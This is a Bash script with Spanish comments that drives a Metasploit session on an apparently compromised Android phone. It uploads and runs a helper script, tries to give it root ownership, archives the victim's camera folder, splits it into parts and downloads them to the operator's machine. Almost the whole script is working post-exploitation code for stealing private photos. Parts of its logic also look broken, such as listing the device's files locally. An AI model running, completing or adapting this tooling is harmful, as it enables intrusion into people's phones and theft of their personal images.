#!/bin/bash

# Función para mostrar el uso del script
usage() {
    echo "Uso: $0 -u|-user <USERNAME>"
    exit 1
}

# Inicializar la variable USERNAME
USERNAME=""

# Procesar argumentos de línea de comandos
while [[ "$#" -gt 0 ]]; do
    case $1 in
        -u|--user) USERNAME="$2"; shift ;;
        -h|--help) usage ;;
        *) usage ;;
    esac
    shift
done

# Verificar si se proporcionó un nombre de usuario
if [[ -z "$USERNAME" ]]; then
    echo -e "\e[31mDebe proporcionar un nombre de usuario con la opción -u.\e[0m"
    usage
fi

# Directorio de destino en tu máquina
DEST_DIR="./data/$USERNAME"

# Obtener el primer ID de sesión disponible
SESSION_ID=$(msfconsole -q -x "sessions -l; exit" | awk '/^\s*[0-9]+/ {print $1; exit}')

# Verificar si se encontró una sesión
if [ -z "$SESSION_ID" ]; then
    echo -e "\e[31mNo se encontró ninguna sesión activa.\e[0m"
    exit 1
fi

echo -e "\e[32mSe encontró una sesión activa con el ID $SESSION_ID.\e[0m"
echo -e "\e[32mCreando el directorio de destino $DEST_DIR...\e[0m"

# Crear el directorio de destino si no existe
mkdir -p "$DEST_DIR"

# Generar el archivo de recursos de Metasploit
cat <<EOL > get.rc
echo "Obteniendo información del dispositivo..."
sessions -interact $SESSION_ID --timeout 7200
shell
echo "Cambiando al directorio /sdcard/DCIM"
cd /sdcard/DCIM
shell
echo "Subiendo el script per.sh"
upload ./utilities/per.sh
shell
echo "Dando permisos de ejecución al script per.sh"
chmod +x per.sh
shell
echo "Cambiando el propietario del script per.sh a root (si es posible)"
chown root:root per.sh || true
shell
echo "Ejecutando el script per.sh"
./per.sh
shell
echo "Comprimiendo el directorio Camera"
tar -czvf Camera.tar.gz Camera
shell
echo "Dividiendo el archivo Camera.tar.gz en partes de 50MB"
split -b 50M Camera.tar.gz Camera.tar.gz.part
echo "Descargando las partes del archivo Camera.tar.gz"
EOL

for part in $(ls /sdcard/DCIM/Camera.tar.gz.part*); do
    echo "download /sdcard/DCIM/$(basename $part) $DEST_DIR/$(basename $part)" >> get.rc
done

# Ejecutar Metasploit con el archivo de recursos
resource get.rc